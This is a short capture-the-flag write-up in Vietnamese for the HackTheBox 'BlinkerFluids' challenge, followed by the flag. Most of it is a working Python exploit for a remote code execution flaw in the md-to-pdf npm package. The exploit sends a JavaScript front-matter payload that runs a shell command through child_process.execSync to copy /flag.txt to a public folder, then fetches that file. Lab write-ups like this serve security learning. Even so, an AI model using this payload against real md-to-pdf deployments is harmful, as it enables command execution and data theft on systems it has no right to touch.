# BlinkerFluids

package `md-to-pdf` bị lỗi [RCE](https://snyk.io/test/npm/md-to-pdf/4.1.0).

script:
```py
import requests

s = requests.Session()

burp0_url = "http://138.68.189.179:31547"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://64.227.37.214:32653", "Referer": "http://64.227.37.214:32653/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_json={"markdown_content": "---js\n((require(\"child_process\")).execSync(\"cat /flag.txt > /app/static/flag.txt \"))\n---RCE"}
s.post(burp0_url + "/api/invoice/add", headers=burp0_headers, json=burp0_json)

r = s.get(burp0_url + "/static/flag.txt", headers=burp0_headers,)

print(r.text)
```

**HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls**